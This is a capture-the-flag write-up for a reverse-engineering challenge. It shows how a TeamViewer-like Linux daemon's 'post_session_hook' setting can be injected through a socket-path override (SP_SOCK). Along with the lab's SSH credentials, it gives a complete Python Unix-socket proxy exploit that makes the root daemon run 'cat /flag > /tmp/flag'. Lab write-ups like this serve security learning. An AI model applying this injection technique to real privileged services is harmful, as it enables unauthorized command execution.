---
ctf: "IBOH2026 CTF"
title: "Reverse my connection"
category: "rev"
difficulty: ""
tags: []
flag_format: "IBOH26{...}"
date: "2026-11-14"
---

## Challenge

Author: @Hybread

Behold, my best effort at converting a N-day TeamViewer finding of mine into Linux.

Connect to your spawned instance using SSH:

ssh -p <INSTANCE_PORT> Hybread@<INSTANCE_HOST>

Password: HybreadIsNoob

P.S. vim is installed in the box ;)


## Approach

### 1. Recon

Connect to the instance over SSH:

```bash
ssh -p <INSTANCE_PORT> Hybread@challenges.battleofhackers.com
# password: HybreadIsNoob
```

Initial checks showed that the account was an unprivileged user and that `sudo` was unavailable. The home directory contained a symlink to `/usr/local/bin/SoloParticipant`. Running it showed a TeamViewer-like client with a generated ID and password.

The client communicates with a local Unix socket. The socket path can be overridden with `SP_SOCK`, so a local proxy can intercept and modify the protocol:

```bash
SP_SOCK=/tmp/probe.sock /usr/local/bin/SoloParticipant
```

The daemon socket was identified as `/run/sphostd/sphostd.sock`. The binary was copied locally and inspected with:

```bash
scp -P <INSTANCE_PORT> Hybread@challenges.battleofhackers.com:/usr/local/bin/sphostd .
objdump -d -M intel sphostd > sphostd.asm
strings sphostd | grep -E 'post_session_hook|session|socket|authenticated'
```

Relevant strings included `post_session_hook`, `OK post_session_hook set`, `OK session started`, and the daemon socket path.

### 2. Vulnerability

The local daemon accepted a settings-write message for `post_session_hook` from an authenticated client. That setting was later executed as a shell command when a session was triggered. Since `SoloParticipant` allowed its socket path to be redirected with `SP_SOCK`, a proxy could:

1. Forward the legitimate client/daemon traffic.
2. Inject a `post_session_hook` setting containing `cat /flag > /tmp/flag`.
3. Send the session trigger after the daemon acknowledged the setting.

The protocol uses a one-byte key length, a two-byte little-endian value length, and message type `0x09` for a setting write. The session trigger is `0x0a` with a zero-length body (`0a 00 00`).

### 3. Exploit

Run this in Terminal 1 on the instance:

```bash
python3 - <<'PY'
import socket, os, select, struct

p = "/tmp/probe.sock"
try:
    os.unlink(p)
except FileNotFoundError:
    pass

def setting(key, value):
    key = key.encode()
    value = value.encode()
    body = bytes([len(key)]) + key + struct.pack("<H", len(value)) + value
    return b"\x09" + struct.pack("<H", len(body)) + body

server = socket.socket(socket.AF_UNIX)
server.bind(p)
server.listen(1)
print("listening", flush=True)

client, _ = server.accept()
root = socket.socket(socket.AF_UNIX)
root.connect("/run/sphostd/sphostd.sock")
print("proxy connected", flush=True)

injected = triggered = False

while True:
    for sock in select.select([client, root], [], [])[0]:
        data = sock.recv(4096)
        if not data:
            raise SystemExit

        if sock is client:
            print("C->R", data.hex(), flush=True)
            root.sendall(data)

            if data.startswith(b"\x09") and not injected:
                payload = setting("post_session_hook", "cat /flag > /tmp/flag")
                print("SET HOOK", payload.hex(), flush=True)
                root.sendall(payload)
                injected = True
        else:
            print("R->C", data.hex(), flush=True)
            client.sendall(data)

            if injected and not triggered and b"post_session_hook set\n" in data:
                payload = b"\x0a\x00\x00"
                print("TRIGGER", payload.hex(), flush=True)
                root.sendall(payload)
                triggered = True
PY
```

Run this in Terminal 2:

```bash
SP_SOCK=/tmp/probe.sock /usr/local/bin/SoloParticipant
```

The proxy must wait for the specific response `OK post_session_hook set`; triggering on a generic `set` response is too early. Once Terminal 1 prints `TRIGGER 0a0000`, read the flag:

```bash
cat /tmp/flag
```

### 4. Final flag

The command produced:

```text
IBOH26{redacted}
```

## Tools

- SSH
- `strings`
- `objdump`
- Python Unix-socket proxy

## Lessons

- Always inspect local IPC endpoints and environment-variable overrides.
- A client-side socket-path override can expose privileged daemon functionality to a proxy.
- Protocol fields must be reconstructed exactly; the key length was one byte, while the value length was a little-endian two-byte integer.
- Wait for the correct acknowledgement before sending a state-dependent trigger.

## Flag

`IBOH26{redacted}`

